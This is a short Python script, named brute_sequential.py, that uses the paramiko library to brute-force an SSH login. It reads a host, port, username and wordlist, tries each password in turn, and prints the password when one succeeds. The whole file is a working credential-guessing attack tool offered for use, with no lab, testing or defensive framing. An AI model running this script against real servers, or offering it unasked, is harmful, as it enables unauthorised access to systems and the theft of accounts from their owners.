# brute_sequential.py
import paramiko
import logging
import time

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def try_login(host, port, username, password, timeout=3.0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        return "success"
    except paramiko.AuthenticationException:
        return "failure"
    except Exception:
        return "error"
    finally:
        client.close()

host     = input("Host: ").strip()
port     = int(input("Port [22]: ").strip() or "22")
username = input("Username: ").strip()
wordlist = input("Wordlist [wordlist.txt]: ").strip() or "wordlist.txt"

with open(wordlist) as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"\n[*] Trying {len(passwords)} passwords...\n")
start = time.time()

for i, password in enumerate(passwords, 1):
    print(f"  [{i}/{len(passwords)}] Trying: {password}", end="\r")
    result = try_login(host, port, username, password)

    if result == "success":
        print(f"\n\n[+] FOUND! Password is: {password}")
        print(f"[*] Time: {time.time() - start:.2f}s")
        break
else:
    print(f"\n\n[-] Password not found ({time.time() - start:.2f}s)")